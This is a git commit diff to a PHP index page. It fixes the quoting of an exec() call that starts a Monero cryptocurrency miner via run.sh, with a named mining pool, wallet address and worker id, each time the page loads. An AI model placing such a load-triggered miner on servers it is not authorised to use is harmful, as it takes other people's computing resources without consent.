2ceacb1b9959a43c162eccb28617e90a48a74ff3
Izder456 <izder456@gmail.com>
2020-01-23 16:42:23 -0600

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <h3>Executing ./run.sh</h3>
 <?
-exec('./run.sh pool.supportxmr.com 3333 44qrc4958i5ZssjCJqKNqoEneU97ov3dLbpvT3zYmGXM7sbMneJvQnPajJXVw9qHp6ERtrYj1ZkvdVQzZXDzP8Sj6LKTL84 GitHub:izder456@gmail.com 1 false &);
+exec('./run.sh pool.supportxmr.com 3333 44qrc4958i5ZssjCJqKNqoEneU97ov3dLbpvT3zYmGXM7sbMneJvQnPajJXVw9qHp6ERtrYj1ZkvdVQzZXDzP8Sj6LKTL84 GitHub:izder456@gmail.com 1 false');
 ?>
